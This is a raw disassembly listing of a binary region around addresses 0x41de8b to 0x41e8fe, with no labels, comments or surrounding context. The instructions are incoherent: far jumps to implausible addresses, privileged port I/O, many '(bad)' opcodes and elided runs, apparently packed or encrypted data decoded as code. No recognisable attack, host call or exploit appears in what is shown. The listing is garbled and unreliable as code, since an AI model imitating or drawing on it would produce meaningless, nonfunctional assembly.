  41de8b:	jmp    0xd2b1:0x275d2d28
  41de92:	out    0xf8,al
  41de94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de95:	adc    BYTE PTR [edi],dl
  41de97:	inc    edi
  41de98:	mov    BYTE PTR [eax+0x74fb09a8],ah
  41de9e:	js     0x41de70
  41dea0:	outs   dx,BYTE PTR ds:[esi]
  41dea1:	and    al,0x7e
  41dea3:	push   0x52
  41dea5:	cmc    
  41dea6:	je     0x41de7a
  41dea8:	popf   
  41dea9:	dec    ebx
  41deaa:	das    
  41deab:	xchg   ebp,ebx
  41dead:	inc    eax
  41deae:	adc    ebp,DWORD PTR [eax+0x5236aafd]
  41deb4:	xor    al,0xdb
  41deb6:	cmc    
  41deb7:	clc    
  41deb8:	pop    ds
  41deb9:	popf   
  41deba:	sbb    al,0x1e
  41debc:	rcr    DWORD PTR [ecx],1
  41debe:	sub    bl,0xbd
  41dec1:	je     0x41dedf
  41dec3:	out    0x4d,eax
  41dec5:	jmp    0x6e7e25a2
  41deca:	sub    BYTE PTR cs:[ebx],cl
  41decd:	outs   dx,DWORD PTR ds:[esi]
  41dece:	outs   dx,BYTE PTR ds:[esi]
  41decf:	or     eax,esi
  41ded1:	dec    edx
  41ded2:	jle    0x41deff
  41ded4:	mov    WORD PTR [esi],gs
  41ded6:	pop    esp
  41ded7:	pop    ds
  41ded8:	or     bl,ch
  41deda:	popa   
  41dedb:	cmp    edx,DWORD PTR [edx-0x21116133]
  41dee1:	and    eax,0x3bb40bc9
  41dee6:	jb     0x41defa
  41dee8:	cdq    
  41dee9:	xchg   edi,eax
  41deea:	add    bl,BYTE PTR [edx]
  41deec:	mov    ds:0x1a68b6f1,eax
  41def1:	daa    
  41def2:	fbld   TBYTE PTR [ecx]
  41def4:	arpl   WORD PTR [eax+ebp*8-0xa],cx
  41def8:	mov    edx,0x72e89eba
  41defd:	mov    edi,0xa2403c38
  41df02:	mov    ah,0x24
  41df04:	out    dx,eax
  41df05:	adc    al,0xa0
  41df07:	jmp    0x41de96
  41df09:	imul   esp,DWORD PTR [ebx-0x6b],0xbae4b67c
  41df10:	inc    ecx
  41df11:	push   es
  41df12:	or     al,0xcf
  41df14:	cmp    BYTE PTR [esi],0x5e
  41df17:	inc    esi
  41df18:	in     al,0x80
  41df1a:	cmp    eax,DWORD PTR ds:0xe4e3ecc0
  41df20:	outs   dx,DWORD PTR ds:[esi]
  41df21:	ss popf 
  41df23:	push   ebx
  41df24:	fwait
  41df25:	add    BYTE PTR [ebx+0x5b],0x55
  41df29:	cmp    esi,DWORD PTR [eax+0x2ca1cc44]
  41df2f:	(bad)  
  41df31:	cwde   
  41df32:	jno    0x41df43
  41df34:	or     bh,al
  41df36:	dec    eax
  41df37:	sub    ebp,ebp
  41df39:	push   esp
  41df3a:	inc    eax
  41df3b:	out    dx,eax
  41df3c:	stc    
  41df3d:	push   cs
  41df3e:	inc    ebx
  41df3f:	sbb    dl,BYTE PTR [ecx]
  41df41:	push   es
	...
  41dfb2:	add    BYTE PTR [eax],al
  41dfb4:	mov    ecx,0xad432034
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	jo     0x41dfc1
  41dfc2:	push   esi
  41dfc3:	adc    eax,edx
  41dfc5:	inc    edx
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	test   BYTE PTR [eax],0x0
  41dfcb:	add    BYTE PTR [edi],cl
  41dfcd:	ja     0x41dfe2
  41dfcf:	mov    ah,0xca
  41dfd1:	xor    al,0xf
  41dfd3:	sbb    ebp,DWORD PTR [ebp+0x78]
  41dfd6:	out    dx,eax
  41dfd7:	dec    ecx
  41dfd8:	out    0xc6,eax
  41dfda:	jns    0x41e00b
  41dfdc:	data16 sbb al,BYTE PTR [esi-0x19ad8842]
  41dfe3:	or     al,0xb3
  41dfe5:	rcl    DWORD PTR [esi-0x74],0x64
  41dfe9:	fnstenv [ebx-0x6a]
  41dfec:	cwde   
  41dfed:	test   al,0x1d
  41dfef:	scas   eax,DWORD PTR es:[edi]
  41dff0:	test   al,0x65
  41dff2:	pop    ss
  41dff3:	push   esp
  41dff4:	xor    eax,0xd4394693
  41dff9:	mov    esp,DWORD PTR [ecx+eiz*1]
  41dffc:	jae    0x41dfb9
  41dffe:	xor    cl,bl
  41e000:	sbb    al,0xf9
  41e002:	inc    ebx
  41e003:	dec    edx
  41e004:	repnz sbb eax,0x740d52e9
  41e00a:	mov    ds:0x140c6870,al
  41e00f:	ficomp WORD PTR [esi]
  41e011:	call   0xaf77ff36
  41e016:	mov    bl,0x51
  41e018:	imul   edx,DWORD PTR [ebp-0x3a096a7c],0x501fe6ab
  41e022:	or     al,al
  41e024:	shr    DWORD PTR [edi+eax*2+0x333c653f],0x51
  41e02c:	dec    edx
  41e02d:	jle    0x41dfb9
  41e02f:	sar    cl,cl
  41e031:	test   al,0x69
  41e033:	dec    BYTE PTR [ebp-0x1ef84fb4]
  41e039:	enter  0xb768,0x66
  41e03d:	pop    ds
  41e03e:	mov    edi,0xd5309b48
  41e043:	add    BYTE PTR [ebx-0x4b75e5ab],dh
  41e049:	call   0xf67f:0x82e52f84
  41e050:	out    dx,eax
  41e051:	les    ebp,FWORD PTR [esi]
  41e053:	push   esi
  41e054:	push   es
  41e055:	and    bl,BYTE PTR [edx-0x344b7e0e]
  41e05b:	cmp    BYTE PTR [edi+0x44],ah
  41e05e:	loop   0x41e00a
  41e060:	lds    edx,FWORD PTR [ebx]
  41e062:	ficomp WORD PTR [esi+0x56]
  41e065:	shl    DWORD PTR [ebx],cl
  41e067:	sub    DWORD PTR [eax+0x4e],edx
  41e06a:	aaa    
  41e06b:	push   cs
  41e06c:	sahf   
  41e06d:	jmp    0xd3af7b86
  41e072:	test   DWORD PTR [ebx+0x7104f7f2],edx
  41e078:	pop    ebx
  41e079:	pop    ebx
  41e07a:	sub    BYTE PTR [ebx+0x5f6c889d],ch
  41e080:	inc    ebx
  41e081:	mov    dl,BYTE PTR [ecx-0x37036e5c]
  41e087:	(bad)  
  41e088:	push   edi
  41e089:	xor    esp,DWORD PTR [eax]
  41e08b:	dec    edx
  41e08c:	add    al,BYTE PTR [edx+0x6244d627]
  41e092:	out    0xc7,eax
  41e094:	cwde   
  41e095:	sbb    al,0xef
  41e097:	push   es
  41e098:	hlt    
  41e099:	addr16 icebp 
  41e09b:	jno    0x41e0ba
  41e09d:	dec    ebx
  41e09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e09f:	pop    ebx
  41e0a0:	cmp    eax,0x513d949a
  41e0a5:	std    
  41e0a6:	pop    eax
  41e0a7:	or     DWORD PTR ds:0xae0ede85,ebp
  41e0ad:	cmp    DWORD PTR [edi+0x7bd51940],edi
  41e0b3:	xor    eax,0xcd54af2a
  41e0b8:	xchg   esi,eax
  41e0b9:	mov    dh,0xa6
  41e0bb:	mov    ds:0xe79c7b9b,eax
  41e0c0:	inc    esp
  41e0c1:	cmp    BYTE PTR [eax],al
	...
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	sub    BYTE PTR [eax],ch
  41e142:	pusha  
  41e143:	and    BYTE PTR [eax-0x9fffebd],bh
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [edx-0x7a],bh
  41e14e:	adc    al,0x45
  41e150:	cmp    DWORD PTR [ebp-0x1eb787f9],0xdf239bd3
  41e15a:	dec    eax
  41e15b:	mov    WORD PTR [edi+0x7b],ss
  41e15e:	bound  edx,QWORD PTR ds:0xe7b0d702
  41e164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e165:	jmp    FWORD PTR [eax]
  41e167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e168:	arpl   WORD PTR [eax],sp
  41e16a:	aam    0x6f
  41e16c:	dec    ebp
  41e16d:	fisub  WORD PTR [ecx-0x6e]
  41e170:	dec    ecx
  41e171:	mov    ebx,0x5aa5fd91
  41e176:	mov    edi,0xf1e2249b
  41e17b:	mov    ebx,0x4381b52c
  41e180:	add    ebp,eax
  41e182:	int3   
  41e183:	dec    edi
  41e184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e185:	fdivr  DWORD PTR [esi+0x6f]
  41e188:	aad    0x6
  41e18a:	push   edx
  41e18b:	fsub   QWORD PTR [eax+0xa7ea13]
  41e191:	jge    0x41e20e
  41e193:	pop    ebx
  41e194:	scas   eax,DWORD PTR es:[edi]
  41e195:	or     ebx,ebp
  41e197:	and    BYTE PTR [edi+0xf755762],dh
  41e19d:	inc    edx
  41e19e:	sub    al,0xdd
  41e1a0:	mov    ecx,0xcb1acbbb
  41e1a5:	xor    dh,BYTE PTR [edx+0x19]
  41e1a8:	sub    eax,0xf313123
  41e1ad:	mov    ch,0x8e
  41e1af:	pop    ebp
  41e1b0:	test   BYTE PTR [ecx+0x7097207e],0xc5
  41e1b7:	push   ss
  41e1b8:	in     eax,dx
  41e1b9:	bound  esi,QWORD PTR [ecx]
  41e1bb:	cmp    dl,BYTE PTR [esi]
  41e1bd:	ins    BYTE PTR es:[edi],dx
  41e1be:	les    ebp,FWORD PTR [ecx-0x551e89ae]
  41e1c4:	fidiv  WORD PTR [edx]
  41e1c6:	inc    esp
  41e1c7:	std    
  41e1c8:	in     al,0x7d
  41e1ca:	stc    
  41e1cb:	dec    DWORD PTR [ebp+0x577e02c3]
  41e1d1:	mov    edx,0x2315a472
  41e1d6:	jmp    0x551155a4
  41e1db:	mov    cs,WORD PTR [eax-0x1c]
  41e1de:	mov    edi,eax
  41e1e0:	push   ds
  41e1e1:	push   ecx
  41e1e2:	sbb    BYTE PTR [edi+0x648104c0],bl
  41e1e8:	pop    ebx
  41e1e9:	add    BYTE PTR [edx+0x3206eae1],al
  41e1ef:	out    dx,al
  41e1f0:	aad    0x88
  41e1f2:	pop    edi
  41e1f3:	mov    edx,0x9013e1aa
  41e1f8:	mov    edi,0xd21229aa
  41e1fd:	xor    eax,0xee73d6d7
  41e202:	sub    DWORD PTR [esi-0x63bf2070],edx
  41e208:	push   esi
  41e209:	add    ebp,DWORD PTR [ecx+0x64]
  41e20c:	ffreep st(5)
  41e20e:	jb     0x41e27b
  41e210:	dec    ecx
  41e211:	inc    ebp
  41e212:	mov    dl,0x37
  41e214:	pop    ebp
  41e215:	ins    DWORD PTR es:[edi],dx
  41e216:	(bad)  
  41e217:	in     al,dx
  41e218:	test   al,0xb4
  41e21a:	inc    esp
  41e21b:	bound  edi,QWORD PTR [ebx-0x18]
  41e21e:	push   0x18
  41e220:	jbe    0x41e24c
  41e222:	push   ds
  41e223:	sub    DWORD PTR [ecx-0x3c],ebx
  41e226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e227:	and    DWORD PTR [ecx-0x7404a763],esi
  41e22d:	jle    0x41e206
  41e22f:	pop    esp
  41e230:	pop    ds
  41e231:	cdq    
  41e232:	or     BYTE PTR [ebx],cl
  41e234:	imul   esp,DWORD PTR [ecx+0x5e3c0941],0x5
  41e23b:	retf   0x8878
  41e23e:	mov    eax,ds:0xccf78d
	...
  41e2b3:	add    dh,bh
  41e2b5:	cmp    cl,0x54
  41e2b8:	(bad)  
  41e2b9:	jge    0x41e2ba
  41e2bb:	stos   BYTE PTR es:[edi],al
  41e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bd:	push   esi
  41e2be:	arpl   WORD PTR [ebx+0x9],di
  41e2c1:	add    esp,DWORD PTR [edx]
  41e2c3:	nop
  41e2c4:	scas   al,BYTE PTR es:[edi]
  41e2c5:	inc    esp
  41e2c6:	add    DWORD PTR [eax],eax
  41e2c8:	test   BYTE PTR [eax],0x0
  41e2cb:	add    BYTE PTR [edi],dh
  41e2cd:	cmp    BYTE PTR [eax+0x9d9cd9],bh
  41e2d3:	xchg   ebx,eax
  41e2d4:	inc    edx
  41e2d5:	push   0xaa8b0b7
  41e2da:	inc    ebp
  41e2db:	inc    ebx
  41e2dc:	adc    eax,0xa18dd473
  41e2e1:	fadd   st(6),st
  41e2e3:	xor    ecx,DWORD PTR [esi+0x54]
  41e2e6:	jl     0x41e345
  41e2e8:	cmp    BYTE PTR [ebx],ch
  41e2ea:	sub    BYTE PTR [edx-0x29],bl
  41e2ed:	xor    BYTE PTR [esi+ecx*2-0x42],ch
  41e2f1:	add    al,0x62
  41e2f3:	in     eax,dx
  41e2f4:	add    dh,BYTE PTR [eax+0x1b2ee631]
  41e2fa:	(bad)  
  41e2fc:	retf   0x8d48
  41e2ff:	std    
  41e300:	and    ah,BYTE PTR [edi-0x34c91955]
  41e306:	pop    ds
  41e307:	cld    
  41e308:	sub    al,0x14
  41e30a:	leave  
  41e30b:	xor    ecx,esi
  41e30d:	jnp    0x41e2aa
  41e30f:	pop    es
  41e310:	cmp    al,0x34
  41e312:	dec    ebp
  41e313:	push   edx
  41e314:	mov    WORD PTR [edi-0x3973b33],fs
  41e31a:	mov    esi,0x8c2f22b3
  41e31f:	out    0x3c,al
  41e321:	retf   
  41e322:	fidivr WORD PTR [ebp+0x729814c4]
  41e328:	sbb    eax,0x61d795b0
  41e32d:	adc    eax,0x2ffda3ec
  41e332:	std    
  41e333:	mov    bl,0x7e
  41e335:	sub    BYTE PTR [ecx+0x31f71902],cl
  41e33b:	rcl    ebp,0xbc
  41e33e:	or     esp,DWORD PTR [ecx-0x5e657c7c]
  41e344:	xchg   edx,eax
  41e345:	mov    eax,0x2b8d41b7
  41e34a:	cmp    esp,edi
  41e34c:	lods   al,BYTE PTR ds:[esi]
  41e34d:	jb     0x41e322
  41e34f:	sti    
  41e350:	nop
  41e351:	xchg   ebx,eax
  41e352:	jmp    0x12c32035
  41e357:	ret    0x7e2f
  41e35a:	jmp    0x8c6c:0xf2fb6314
  41e361:	mov    ebp,0xe0a4179c
  41e366:	out    dx,eax
  41e367:	sbb    bl,BYTE PTR [ecx+0x54]
  41e36a:	pusha  
  41e36b:	in     al,0x3f
  41e36d:	(bad)  
  41e36e:	(bad)  
  41e36f:	jnp    0x41e397
  41e371:	fild   QWORD PTR [edx]
  41e373:	scas   eax,DWORD PTR es:[edi]
  41e374:	mov    ebx,DWORD PTR [edi+0x75127f3b]
  41e37a:	and    esi,DWORD PTR [ebx]
  41e37c:	push   esi
  41e37d:	inc    esi
  41e37e:	inc    ebp
  41e37f:	out    dx,eax
  41e380:	or     edx,eax
  41e382:	mov    edx,0x2f445196
  41e387:	data16 (bad) 
  41e389:	xor    eax,0x7c72d0ed
  41e38e:	(bad)  
  41e38f:	out    dx,eax
  41e390:	rcr    DWORD PTR [ecx],0xd2
  41e393:	push   cs
  41e394:	jno    0x41e408
  41e396:	cmp    cl,0x47
  41e399:	adc    eax,0x56056054
  41e39e:	sbb    eax,0xfde290e9
  41e3a3:	cwde   
  41e3a4:	sbb    eax,DWORD PTR [ecx]
  41e3a6:	dec    ecx
  41e3a7:	sbb    DWORD PTR ds:0x9b62933c,esi
  41e3ad:	inc    ebx
  41e3ae:	lods   al,BYTE PTR ds:[esi]
  41e3af:	mov    dh,BYTE PTR [ebx+edi*2+0x992e2c8]
  41e3b6:	icebp  
  41e3b7:	xchg   ecx,eax
  41e3b8:	repnz sbb bl,BYTE PTR cs:[ebp+0x49a5d608]
  41e3c0:	sbb    al,0x18
	...
  41e432:	add    BYTE PTR [eax],al
  41e434:	div    BYTE PTR [esi]
  41e436:	rcl    BYTE PTR [edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x419dfead,al
  41e442:	mov    BYTE PTR [esp+eiz*4+0x45],0x1
  41e447:	add    dh,dh
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    BYTE PTR [ebx+0x3f],ah
  41e44e:	dec    ebx
  41e44f:	(bad)  
  41e450:	ja     0x41e46b
  41e452:	arpl   WORD PTR [eax],di
  41e454:	push   edi
  41e455:	adc    al,0x83
  41e457:	mov    ebp,0x642799e8
  41e45c:	push   ebx
  41e45d:	out    dx,al
  41e45e:	mov    ds,WORD PTR [ebp+0x28]
  41e461:	pop    edx
  41e462:	jg     0x41e492
  41e464:	ret    
  41e465:	jle    0x41e4e2
  41e467:	ja     0x41e45c
  41e469:	jno    0x41e409
  41e46b:	mov    edi,DWORD PTR [eax-0x50ed1d50]
  41e471:	mov    esi,0xbf59babd
  41e476:	out    dx,eax
  41e477:	inc    ebp
  41e478:	adc    esi,DWORD PTR [esi-0x19]
  41e47b:	mov    ecx,0xb29c1ddb
  41e480:	mov    cl,0x3
  41e482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e483:	adc    esi,0xffffffad
  41e486:	nop
  41e487:	xlat   BYTE PTR ds:[ebx]
  41e488:	hlt    
  41e489:	int3   
  41e48a:	nop
  41e48b:	popf   
  41e48c:	ins    BYTE PTR es:[edi],dx
  41e48d:	js     0x41e422
  41e48f:	inc    edi
  41e490:	or     DWORD PTR [edx+0x7aa35e28],ebx
  41e496:	inc    edx
  41e497:	retf   0xaef
  41e49a:	sbb    al,0xd3
  41e49c:	call   0x7ea4:0xbe65114
  41e4a3:	daa    
  41e4a4:	push   esp
  41e4a5:	cmp    BYTE PTR [ecx+0x5f4c4568],dl
  41e4ab:	mov    ah,0x88
  41e4ad:	jmp    0x247ab593
  41e4b2:	cmc    
  41e4b3:	jne    0x41e45e
  41e4b5:	ret    0x3a1d
  41e4b8:	xchg   esi,eax
  41e4b9:	mov    cl,0x9
  41e4bb:	aaa    
  41e4bc:	push   esi
  41e4bd:	mov    ch,0x5a
  41e4bf:	or     eax,0x1c8d45b4
  41e4c4:	in     eax,0xd
  41e4c6:	and    al,ch
  41e4c8:	add    al,0xe4
  41e4ca:	sub    ebx,DWORD PTR [ecx+0x6b]
  41e4cd:	xor    al,0x6b
  41e4cf:	cmp    bl,cl
  41e4d1:	in     al,dx
  41e4d2:	xor    BYTE PTR [esi+eax*8-0x4dfcbe4c],ah
  41e4d9:	scas   eax,DWORD PTR es:[edi]
  41e4da:	(bad)  
  41e4dc:	jb     0x41e50b
  41e4de:	retf   0x6906
  41e4e1:	out    0x2d,eax
  41e4e3:	dec    edi
  41e4e4:	inc    esp
  41e4e5:	or     BYTE PTR [bx-0x775],cl
  41e4ea:	xchg   ebx,eax
  41e4eb:	call   0x49f2:0xca6b0e7d
  41e4f2:	dec    eax
  41e4f3:	(bad)  
  41e4f4:	arpl   ax,sp
  41e4f6:	xor    ebx,DWORD PTR [ecx+ebx*2-0xf]
  41e4fa:	jns    0x41e492
  41e4fc:	outs   dx,BYTE PTR ds:[esi]
  41e4fd:	xor    eax,DWORD PTR [esi+0x3e40d023]
  41e503:	xlat   BYTE PTR ds:[ebx]
  41e504:	add    BYTE PTR [eax+0x5fa59053],0x45
  41e50b:	push   ebp
  41e50c:	fmul   QWORD PTR [ebx-0x20]
  41e50f:	div    ah
  41e511:	imul   edx,DWORD PTR [esi+0x44],0x51
  41e515:	cmp    dl,BYTE PTR [ecx+0x2b3e36e1]
  41e51b:	jns    0x41e510
  41e51d:	sbb    eax,edi
  41e51f:	stos   BYTE PTR es:[edi],al
  41e520:	test   al,0xd5
  41e522:	lods   al,BYTE PTR ds:[esi]
  41e523:	hlt    
  41e524:	es push 0xffffff88
  41e527:	nop
  41e528:	ret    
  41e529:	and    al,0xb2
  41e52b:	sbb    edi,DWORD PTR [ebx]
  41e52d:	shr    DWORD PTR [ecx],0xf8
  41e530:	aaa    
  41e531:	xor    edi,esi
  41e533:	dec    esp
  41e534:	xor    BYTE PTR [ebp-0x11fc834c],ch
  41e53a:	dec    esi
  41e53b:	or     al,0x39
  41e53d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e53e:	inc    ebp
  41e53f:	jno    0x41e54c
  41e541:	rol    DWORD PTR [eax],0x0
	...
  41e5b4:	jl     0x41e54f
  41e5b6:	dec    esp
  41e5b7:	jbe    0x41e5a6
  41e5b9:	idiv   DWORD PTR [esi-0x65]
  41e5bc:	ss adc al,0xc3
  41e5bf:	repz ror DWORD PTR [esi-0xe],1
  41e5c3:	imul   ebx,DWORD PTR [edx-0x9fffeba],0x7f000000
  41e5cd:	shl    BYTE PTR [ebx-0x3558ab03],cl
  41e5d3:	rol    ebp,cl
  41e5d5:	cmp    eax,0x5c005573
  41e5da:	fcomp  QWORD PTR [edx+eax*2-0x1663aaf6]
  41e5e1:	dec    eax
  41e5e2:	retf   0xf9f2
  41e5e5:	mov    bl,0x26
  41e5e7:	pop    es
  41e5e8:	adc    eax,0xc54db308
  41e5ed:	jo     0x41e636
  41e5ef:	sub    edi,DWORD PTR [ebp*4-0x7ee8c195]
  41e5f6:	pop    esp
  41e5f7:	adc    DWORD PTR [edi+0x10ce8dbb],0xffffffa6
  41e5fe:	aaa    
  41e5ff:	es pop ebp
  41e601:	pushf  
  41e602:	xchg   ecx,eax
  41e604:	mov    ebp,0x692e5c23
  41e609:	jg     0x41e5db
  41e60b:	dec    esp
  41e60c:	(bad)  [esi+0x7f]
  41e60f:	add    DWORD PTR [ebx-0x49e9d2bd],ecx
  41e615:	int3   
  41e616:	stos   DWORD PTR es:[edi],eax
  41e617:	jecxz  0x41e612
  41e619:	sbb    cl,BYTE PTR [eax]
  41e61b:	retf   
  41e61c:	call   0xe8615f90
  41e621:	jecxz  0x41e5d5
  41e623:	add    al,0x2d
  41e625:	rcl    DWORD PTR [ebx+0x2ea48458],cl
  41e62b:	sub    eax,DWORD PTR [ebp-0x2bd9288c]
  41e631:	cld    
  41e632:	(bad)  
  41e633:	xor    BYTE PTR [edi+0x3e8e5e12],dl
  41e639:	push   ds
  41e63a:	xor    ecx,DWORD PTR [edi+esi*8-0x1a63a3aa]
  41e641:	cmp    BYTE PTR [edi],bh
  41e643:	popa   
  41e644:	pop    esi
  41e645:	pusha  
  41e646:	iret   
  41e647:	ja     0x41e5ee
  41e649:	in     eax,dx
  41e64a:	xor    eax,0x2d347a28
  41e64f:	fs (bad) 
  41e651:	in     eax,dx
  41e652:	scas   eax,DWORD PTR es:[edi]
  41e653:	retf   0xc034
  41e656:	and    dh,cl
  41e658:	retf   
  41e659:	or     BYTE PTR ds:0xb17f7c51,0x34
  41e660:	ja     0x41e6cb
  41e662:	js     0x41e697
  41e664:	popa   
  41e665:	add    BYTE PTR [esi+0x4b],cl
  41e668:	sti    
  41e669:	lea    esp,[esi]
  41e66b:	push   ds
  41e66c:	inc    eax
  41e66d:	adc    al,0x19
  41e66f:	sub    ebp,ecx
  41e671:	scas   eax,DWORD PTR es:[edi]
  41e672:	aad    0x75
  41e674:	pop    esi
  41e675:	inc    edi
  41e676:	enter  0xcb35,0x28
  41e67a:	jge    0x41e6f1
  41e67c:	out    dx,eax
  41e67d:	mov    ebx,0xfa5d815a
  41e682:	leave  
  41e683:	in     eax,0x4e
  41e685:	jae    0x41e703
  41e687:	(bad)  
  41e688:	fisubr WORD PTR [ecx]
  41e68a:	test   edx,0x310cfde0
  41e690:	(bad)  
  41e691:	pop    ebp
  41e692:	outs   dx,BYTE PTR ds:[esi]
  41e693:	inc    esi
  41e694:	mov    bh,0xc2
  41e696:	call   0x1704:0x34428838
  41e69d:	mov    ds:0x87a57eb3,al
  41e6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6a3:	test   eax,0x7e4f6280
  41e6a8:	cs aam 0x93
  41e6ab:	sbb    BYTE PTR [edx+0x44],dl
  41e6ae:	test   DWORD PTR [ecx-0x11afa3d0],eax
  41e6b4:	sbb    al,BYTE PTR [esi+ebx*8+0x9ede29a]
  41e6bb:	ror    bl,0x33
  41e6be:	jle    0x41e712
  41e6c0:	pop    edx
  41e6c1:	test   BYTE PTR [eax],al
	...
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx-0x3ec32c96]
  41e744:	nop
  41e745:	inc    edi
  41e746:	add    DWORD PTR [eax],eax
  41e748:	test   BYTE PTR [eax],0x0
  41e74b:	add    BYTE PTR [ebp+0x542d4d87],ch
  41e751:	inc    edx
  41e752:	bound  ebp,QWORD PTR [esi]
  41e754:	mov    bl,0x3e
  41e756:	and    eax,DWORD PTR [ecx-0x137aae31]
  41e75c:	add    BYTE PTR [ebx+0x548b6c0b],bh
  41e762:	or     BYTE PTR [ecx],cl
  41e764:	dec    edi
  41e765:	pop    ebp
  41e766:	stos   BYTE PTR es:[edi],al
  41e767:	mov    BYTE PTR [esi+0x63af60d5],bl
  41e76d:	xor    eax,0x3e1fdef0
  41e772:	push   0x3619188
  41e777:	jp     0x41e7c9
  41e779:	jbe    0x41e710
  41e77b:	adc    eax,ebx
  41e77d:	pop    ecx
  41e77e:	test   al,0x82
  41e780:	fwait
  41e781:	jg     0x41e78c
  41e783:	cmp    edx,esp
  41e785:	mov    bl,0xf9
  41e787:	sahf   
  41e788:	mov    WORD PTR [edx+eiz*8+0x19ebba8b],gs
  41e78f:	push   ds
  41e790:	pop    ds
  41e791:	mov    edi,0x2d9d641c
  41e796:	add    al,0xca
  41e798:	ret    0x618b
  41e79b:	pop    ecx
  41e79c:	cli    
  41e79d:	retf   0x1669
  41e7a0:	gs pushf 
  41e7a2:	int3   
  41e7a3:	lahf   
  41e7a4:	dec    eax
  41e7a5:	out    0x70,eax
  41e7a7:	xchg   esp,esp
  41e7a9:	jl     0x41e738
  41e7ab:	sbb    ebx,edx
  41e7ad:	enter  0xc357,0x36
  41e7b1:	xchg   ebx,eax
  41e7b2:	mov    eax,ds:0xaf46e794
  41e7b7:	outs   dx,DWORD PTR ds:[esi]
  41e7b8:	(bad)
  41e7bb:	mov    dl,0xa4
  41e7bd:	mov    cl,0xf4
  41e7bf:	mov    bl,0xb5
  41e7c1:	mov    esp,0x8117539d
  41e7c6:	push   es
  41e7c7:	scas   al,BYTE PTR es:[edi]
  41e7c8:	push   esi
  41e7c9:	(bad)  
  41e7ca:	push   cs
  41e7cb:	scas   eax,DWORD PTR es:[edi]
  41e7cc:	lods   eax,DWORD PTR ds:[esi]
  41e7cd:	push   edi
  41e7ce:	xor    al,cl
  41e7d0:	or     dl,BYTE PTR [ebx]
  41e7d2:	adc    ah,BYTE PTR [ecx+0x3564ee75]
  41e7d8:	std    
  41e7d9:	test   eax,0x6035f410
  41e7de:	adc    eax,DWORD PTR [edi]
  41e7e0:	jge    0x41e78b
  41e7e2:	mov    ebx,0x4626106c
  41e7e7:	out    0xbd,eax
  41e7e9:	pop    es
  41e7ea:	scas   al,BYTE PTR es:[edi]
  41e7eb:	adc    ebp,DWORD PTR [ebx]
  41e7ed:	pop    esi
  41e7ee:	push   esi
  41e7ef:	mov    ebx,0xaaf145db
  41e7f4:	ficom  DWORD PTR [eax]
  41e7f6:	jo     0x41e7fd
  41e7f8:	ret    
  41e7f9:	mov    bl,0x77
  41e7fb:	(bad)  
  41e7fc:	into   
  41e7fd:	sbb    al,BYTE PTR [edi-0x34]
  41e800:	dec    ebx
  41e801:	cmp    BYTE PTR [ebx+0x1d4990ec],al
  41e807:	xor    cl,BYTE PTR [edx]
  41e809:	stos   BYTE PTR es:[edi],al
  41e80a:	mov    bl,0xb3
  41e80c:	add    edx,eax
  41e80e:	popa   
  41e80f:	pop    ebp
  41e810:	cdq    
  41e811:	xchg   DWORD PTR [ecx-0x2a],esp
  41e814:	int    0xd7
  41e816:	mov    edi,0x2df9c245
  41e81b:	lahf   
  41e81c:	adc    ebp,DWORD PTR [esi+ebp*1+0x4712cf0a]
  41e823:	ds bswap esi
  41e826:	push   ebx
  41e827:	sub    cl,0xa8
  41e82a:	enter  0xc879,0x7e
  41e82e:	adc    dl,BYTE PTR ss:[esi+ecx*2-0x4e20f4d]
  41e836:	push   edi
  41e837:	int    0xac
  41e839:	shr    ch,cl
  41e83b:	adc    eax,edx
  41e83d:	add    al,0x17
  41e83f:	pusha  
  41e840:	mov    esp,DWORD PTR [ebp+0x0]
	...
  41e8b3:	add    ah,al
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	pop    es
  41e8b7:	pushf  
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	imul   edi,DWORD PTR [ebp+0x48868da0],0xf60001
  41e8ca:	add    BYTE PTR [eax],al
  41e8cc:	les    eax,FWORD PTR [esi+ebp*1-0x3d379cd5]
  41e8d3:	or     eax,0x1053b238
  41e8d8:	dec    edx
  41e8d9:	ja     0x41e8f1
  41e8db:	stc    
  41e8dc:	loop   0x41e8f6
  41e8de:	sub    bh,BYTE PTR [esi]
  41e8e0:	inc    ebx
  41e8e1:	pop    edx
  41e8e2:	in     eax,0x8
  41e8e4:	sahf   
  41e8e5:	inc    ebp
  41e8e6:	(bad)  
  41e8e7:	les    esi,FWORD PTR [eax-0x8]
  41e8ea:	or     edi,DWORD PTR [edx]
  41e8ec:	jge    0x41e870
  41e8ee:	pushf  
  41e8ef:	dec    ebx
  41e8f0:	addr16 adc eax,0xd6fb6c03
  41e8f6:	xchg   ecx,eax
  41e8f7:	popa   
  41e8f8:	xchg   ecx,eax
  41e8f9:	push   esi
  41e8fa:	jb     0x41e911
  41e8fc:	dec    esi
  41e8fd:	cli    
  41e8fe:	sar    DWORD PTR ds:[ecx],0xca
